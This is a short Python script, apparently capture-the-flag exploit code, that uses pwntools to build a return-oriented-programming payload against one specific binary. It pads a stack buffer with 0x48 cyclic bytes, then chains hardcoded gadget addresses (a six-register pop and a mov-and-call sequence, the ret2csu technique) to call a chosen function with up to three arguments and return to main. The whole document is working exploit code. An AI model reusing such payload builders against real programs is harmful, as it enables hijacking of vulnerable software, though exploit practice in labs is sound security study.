from typing import List

from pwn import *
def gadget(target:int,args:List[int]):
    pop6_address = 0x40075a
    mov_call_adress=0x400740
    main_address = 0x400550
    print(args)
    payload=cyclic(0x48)+p64(pop6_address)+\
    p64(0)+p64(1)+p64(target)+\
    p64(args[2] if len(args)>=3 else 0)+\
    p64(args[1] if len(args)>=2 else 0)+\
    p64(args[0] if len(args)>=1 else 0)
    assert len(args)<=3
    payload+=p64(mov_call_adress)+\
             cyclic(7*8)+p64(main_address)
    payload=payload.ljust(200)
    return payload